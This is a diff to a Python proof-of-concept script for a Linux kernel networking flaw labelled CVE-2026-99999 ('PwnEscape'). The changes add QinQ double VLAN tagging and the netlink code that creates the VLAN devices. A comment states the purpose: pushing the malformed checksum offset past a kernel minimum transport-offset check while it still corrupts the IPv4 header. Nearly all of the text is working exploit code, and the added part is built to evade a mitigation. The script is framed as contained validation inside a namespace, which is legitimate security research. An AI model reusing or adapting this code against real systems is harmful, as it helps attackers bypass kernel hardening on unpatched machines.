@@ -4,7 +4,8 @@ CVE-2026-99999 (PwnEscape) -- bounded functional validation.
 
 Runs entirely inside a fresh user+network namespace (invoke via: unshare -Urn).
 All traffic stays on two private veth pairs created inside that namespace; two
-90-byte frames are sent (one control, one active). No external traffic.
+QinQ-tagged 98-byte frames are sent (one control, one active). No external
+traffic.
 
 Mechanism (Linux 6.1, pre-fix ip_do_fragment):
   1. AF_PACKET TX with PACKET_VNET_HDR marks the skb CHECKSUM_PARTIAL with
@@ -63,10 +64,12 @@ RTM_NEWNEIGH = 28
 IFLA_ADDRESS = 1
 IFLA_IFNAME = 3
 IFLA_MTU = 4
+IFLA_LINK = 5
 IFLA_LINKINFO = 18
 IFLA_INFO_KIND = 1
 IFLA_INFO_DATA = 2
 VETH_INFO_PEER = 1            # include/uapi/linux/veth.h
+IFLA_VLAN_ID = 1              # include/uapi/linux/if_link.h
 
 RTA_DST = 1                   # include/uapi/linux/rtnetlink.h
 RTA_OIF = 4
@@ -97,6 +100,12 @@ IP_SRC = bytes([10, 5, 5, 5])
 
 MTU_EGRESS = 68                # veth minimum MTU; 60 (corrupted header) + 8 data
 DGRAM_LEN = 76                 # 20 IP + 8 UDP + 48 payload
+VLAN_OUTER = 100
+VLAN_INNER = 200
+L2_LEN = 22                    # Ethernet 14 + two 802.1Q headers
+CSUM_START_ACTIVE = L2_LEN
+CSUM_START_CONTROL = L2_LEN + 20
+VNET_HDR_LEN = L2_LEN + 20 + 8
 
 
 def out(tag, **kv):
@@ -201,6 +210,16 @@ def veth_create(nl, name_a, name_b):
     nl.req(RTM_NEWLINK, body, NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL)
 
 
+def vlan_create(nl, parent_idx, name, vlan_id):
+    info = attr(IFLA_INFO_KIND, b"vlan\x00") \
+        + attr(IFLA_INFO_DATA, attr(IFLA_VLAN_ID, struct.pack("<H", vlan_id)))
+    body = struct.pack("<BBHiII", AF_UNSPEC, 0, 0, 0, 0, 0) \
+        + attr(IFLA_LINK, struct.pack("<I", parent_idx)) \
+        + attr(IFLA_IFNAME, name.encode() + b"\x00") \
+        + attr(IFLA_LINKINFO, info)
+    nl.req(RTM_NEWLINK, body, NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL)
+
+
 # --------------------------------------------------------------- checksum --
 def wsum(data):
     """Unbounded sum of big-endian 16-bit words (skb_checksum semantics)."""
@@ -273,10 +292,12 @@ def build_case(ident, csum_start, csum_off, payload):
 
     vnet = struct.pack(VNET_HDR_FMT, VIRTIO_NET_HDR_F_NEEDS_CSUM,
                        VIRTIO_NET_HDR_GSO_NONE,
-                       42,                          # Ethernet + IPv4 + UDP
+                       VNET_HDR_LEN,                # QinQ + IPv4 + UDP
                        0,                           # no GSO; only partial checksum
                        csum_start, csum_off)
-    eth = bytes(MAC_IN_RX) + bytes(MAC_IN_TX) + b"\x08\x00"
+    eth = (bytes(MAC_IN_RX) + bytes(MAC_IN_TX)
+           + struct.pack("!HHHHH", 0x8100, VLAN_OUTER,
+                         0x8100, VLAN_INNER, ETH_P_IP))
     tx = vnet + eth + hdr64 + udp + payload
     return tx, datagram
 
@@ -411,7 +432,16 @@ def main():
     link_set(nl, idx["vInRx"], mac=MAC_IN_RX, up=True)
     link_set(nl, idx["vOutTx"], mac=MAC_OUT_TX, mtu=MTU_EGRESS, up=True)
     link_set(nl, idx["vOutRx"], mac=MAC_OUT_RX, up=True)
-    addr_add(nl, idx["vInRx"], IP_IN_RX, 16)
+    # QinQ raises csum_start from 14 to 22, passing the 6.12 minimum
+    # transport-offset check. The two VLAN devices remove both tags before
+    # IPv4 processing, so csum_start again lands at IPv4 byte 0.
+    vlan_create(nl, idx["vInRx"], "vlan100", VLAN_OUTER)
+    idx = link_index_map(nl)
+    link_set(nl, idx["vlan100"], up=True)
+    vlan_create(nl, idx["vlan100"], "vlan200", VLAN_INNER)
+    idx = link_index_map(nl)
+    link_set(nl, idx["vlan200"], up=True)
+    addr_add(nl, idx["vlan200"], IP_IN_RX, 16)
     addr_add(nl, idx["vOutTx"], IP_OUT_TX, 16)
     neigh_add(nl, idx["vOutTx"], IP_DST, MAC_NH)
     sysctl_path = "/proc/sys/net/ipv4/ip_forward"
@@ -431,6 +461,7 @@ def main():
             # obtain an explicit no-forwarding result instead of aborting.
             out("sysctl_warning", op="write_ip_forward", error=repr(exc))
     out("netns", vInTx=idx["vInTx"], vInRx=idx["vInRx"],
+        vlan100=idx["vlan100"], vlan200=idx["vlan200"],
         vOutTx=idx["vOutTx"], vOutRx=idx["vOutRx"],
         vOutTx_mtu=MTU_EGRESS,
         ip_forward={True: "enabled", False: "disabled", None: "unknown"}[forwarding])
@@ -456,7 +487,7 @@ def main():
 
     # ---- control: valid metadata (csum_start = start of UDP header) ----
     payload_c = b"\xA5" * payload_len
-    tx_c, _ = build_case(0x6001, 34, 6, payload_c)
+    tx_c, _ = build_case(0x6001, CSUM_START_CONTROL, 6, payload_c)
     tx = open_tx_socket()
     out("send_stage", case="control", step="before", bytes=len(tx_c))
     sent_c = tx.send(tx_c)
@@ -469,7 +500,7 @@ def main():
     payload_a, expected = tune_payload(hdr63_a, udp, payload_len)
     out("active_target", checksum="0x%04x" % expected if expected else "unresolved",
         payload_head=payload_a[:8].hex())
-    tx_a, datagram = build_case(0x6002, 14, 0, payload_a)
+    tx_a, datagram = build_case(0x6002, CSUM_START_ACTIVE, 0, payload_a)
     tx = open_tx_socket()
     out("send_stage", case="active", step="before", bytes=len(tx_a))
     try:
